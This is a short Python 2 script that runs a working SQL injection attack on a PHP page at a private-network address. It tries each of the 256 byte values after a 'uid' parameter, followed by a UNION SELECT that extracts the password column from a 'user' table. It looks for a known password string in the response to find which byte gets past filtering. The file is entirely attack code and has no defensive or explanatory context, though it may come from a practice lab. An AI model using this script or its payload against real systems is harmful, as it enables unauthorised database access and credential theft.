import urllib2
import httplib
import re
import sys, time

url = '192.168.28.129'

for i in range(0,256):

    payload = '/id1.php?uid=2'
    payload = payload + chr(i)

    test= 'union%20select%201,2,password,4,5,6,7%20from%20user'

    conn = httplib.HTTPConnection(url)

    print payload+test

    conn.request('GET',payload+test)

    res  = conn.getresponse().read()
    #print res
    if(re.search('qq123456',res)):
        print 'chr(%d)' % i
        print res
